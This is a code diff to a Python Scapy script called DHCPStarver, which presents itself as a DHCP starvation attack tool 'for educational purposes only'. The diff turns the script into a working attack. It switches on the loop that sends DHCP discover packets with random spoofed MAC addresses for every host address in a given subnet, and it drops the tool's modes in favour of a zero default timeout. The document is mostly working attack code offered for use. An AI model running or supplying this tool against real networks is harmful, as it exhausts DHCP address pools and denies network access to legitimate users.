@@ -26,14 +26,17 @@ def displayBanner():
 # ---------------------------------------------------------------------------------------------------------
 
 def makeDHCPRequest(interface, nb, timeOut, debug):
-# Function to craft simple DHCP discover request
+# Function to craft simple DHCP discover request with loop
     
     conf.checkIPaddr = False
 
+    if timeOut > 3:
+        displayInfo = True
+    else:
+        displayInfo = False
+
     # Get a random MAC address
     randomMac = RandMAC()
-    #randomMac = generateMacAddress()
-    
 
     # Craft DHCP discover request
     ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=randomMac)
@@ -43,11 +46,13 @@ def makeDHCPRequest(interface, nb, timeOut, debug):
     dhcp     = DHCP(options=[("message-type","discover"),('end')])
     packet   = ethernet / ip / udp / bootp / dhcp
 
+    print(f"[+] Craft and send frame with {randomMac} mac address")
+
     # Send DHCP discover request through specified interface
     for i in range(nb):
         # If user choose only 1 retry, don't display "Send packet 1/X"...useless
-        if nb > 1:
-            print(f"Send packet [{i + 1}/{nb}]")
+        if nb > 1 and displayInfo:
+            print(f"Send frame [{i + 1}/{nb}]")
 
         answer, unanwser = srp(packet,iface = interface, multi = True, verbose = debug, timeout = timeOut)
 
@@ -57,25 +62,26 @@ def makeDHCPRequest(interface, nb, timeOut, debug):
             break
 
     # If no answer received
-    if not answer:
-        print("[-] No DHCP offer from a DHCP server...")
+    if not answer and displayInfo:
+        print("[-] Scapy failed to recover DHCP offer, may be with another sniffer...\n")
     # Else if we have an answer from a DHCP server
-    elif answer:
+    elif answer and displayInfo:
         # Loop on the answer, to extract send/receive part
         for snd,rcv in answer:
             # Extract IP of DHCP server
             ipSrv = rcv.sprintf(r"%IP.src%")
+            # Extract mac address of DHCP server
+            macSrv = rcv.sprintf(r"%Ether.src%")
             # Extract offered IP
             ipOffer = rcv.sprintf(r"%IP.dst%")
         # Finally print received DHCP offder
-        print(f"[+] DHCP offer : {ipOffer} (from {ipSrv})")
+        print(f"[+] DHCP offer : {ipOffer} (from {macSrv} - {ipSrv})\n")
         
         # Regex from D@d@
         # re.findall('([0-9]*.[0-9]*.[0-9]*.[0-9]*):bootpc /', str(answer))
         
     return
 
-# ---------------------------------------------------------------------------------------------------------
 
 # -----------------------------------------------------------
 #                      ArgsParse section
@@ -89,12 +95,7 @@ parser = argparse.ArgumentParser(
 formatter_class=argparse.RawDescriptionHelpFormatter,
 
 description="""
-DHCPStarver is a tool to perform a DHCP starvation attack with different modes : \n
-
-- info mode allow to discover DHCP servers in the network
-- fast mode allow to make a lot of DHCP discover in an short interval
-- slow mode wait answers from DHCP servers and provide more informations about DHCP offers
-
+DHCPStarver is a tool to perform a DHCP starvation attack : \n
 # -------------------------------- #
 #  For educationnal purposes only  #
 # -------------------------------- #
@@ -103,13 +104,11 @@ DHCPStarver is a tool to perform a DHCP starvation attack with different modes :
 )
 
 # Add arguments 
-parser.add_argument('mode', help='Specify mode [info/fast/slow] (Default is fast),', default='fast')
 parser.add_argument('-i', help='Interface used to make DHCP discover (e.g eth0)', required=True)
 parser.add_argument('-s', help='Specify a subnet with CIDR notation (e.g 192.168.0.0/24)',required=True)
-parser.add_argument('-t', help='Specify timeout for each packet (in seconds, default 0)', default=3, type=int)
+parser.add_argument('-t', help='Specify timeout for each packet (in seconds, default 0)', default=0, type=int)
 parser.add_argument('-r', help='Number of retry for each packet (default 0)', default=0, type=int)
-parser.add_argument('-d', help='Enable scapy debug mode (False if ommited)', action="store_true",default='False')
-
+parser.add_argument('-d', help='Enable scapy debug mode (False if ommited)', action="store_true",default=False)
 
 displayBanner()
 
@@ -123,20 +122,19 @@ if len(sys.argv)==1:
     parser.print_help(sys.stderr)
     exit()
 
-# Define the mode
-mode = args.mode
 # Define a network in CIDR notation
 subnet = args.s
 # Define interface used for dhcp spoofed request
 interface = args.i
 # Number of request by mac address
 nb = args.r
+# If default value is 0, make at last one request
+if nb == 0:
+    nb = 1
 # Define timeout (in seconds) for each DHCP discover request
 timeOut = args.t
 # Define a debug variable for Scapy
 debug = args.d
-
-
 
 # Check if interface exist in the host
 if interface not in netifaces.interfaces():
@@ -168,8 +166,14 @@ except netaddr.AddrFormatError as e:
 # Answer analyzing from 
 # https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html
 
-# Thanks for D@D@ from Montpellier for his regex
+# Hypothetic futur DHCP server 
+# http://pydhcplib.tuxfamily.org/pmwiki/index.php?n=Site.ServerExample
 
+# -------------------------------------------------- #
+# < Thanks for D@D@ from Montpellier for his regex > #
+# -------------------------------------------------- #
+#  View the last line of makeDHCPRequest() function  #
+# -------------------------------------------------- #
 
 # Get ip range with netaddr library
 # .iter_host() allow to get only 'hostable' ip
@@ -177,11 +181,11 @@ ipRange = netaddr.IPNetwork(subnet).iter_hosts()
 
 # Simple loop to make DHCP discover request on the IP range
 for index,ip in enumerate(ipRange):
-    print(ip)
-    #print(f"[+] DHCP discover {index + 1}/{len(list(ipRange))}")
-    #makeDHCPRequest(interface, nb, timeOut, debug)
-    
 
-# Futur DHCP server 
-# http://pydhcplib.tuxfamily.org/pmwiki/index.php?n=Site.ServerExample
+    makeDHCPRequest(interface, nb, timeOut, debug)
+
+
+
+
+
 
